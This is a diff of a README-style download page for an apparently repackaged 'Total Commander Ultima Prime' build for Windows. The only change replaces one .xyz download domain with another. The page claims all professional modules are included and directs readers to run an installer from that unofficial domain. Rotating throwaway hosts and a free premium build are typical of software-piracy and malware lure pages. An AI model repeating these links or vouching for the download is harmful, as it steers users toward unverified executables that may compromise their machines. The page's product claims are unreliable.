@@ -18,8 +18,8 @@ Total Commander Ultima Prime for Windows PCs | clean panels | predictable first 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[total-commander.nexpath.xyz](https://total-commander.nexpath.xyz/)**
-* **Full URL:** `https://total-commander.nexpath.xyz/`
+* **Project link:** **[total-commander.nerasix.xyz](https://total-commander.nerasix.xyz/)**
+* **Full URL:** `https://total-commander.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ All professional modules are included in this build. After setup, launch locally
 * **RAM:** 8 GB RAM suggested | 16 GB for heavy workloads
 * **Disk:** 3 GB free disk space
 
-***
+***
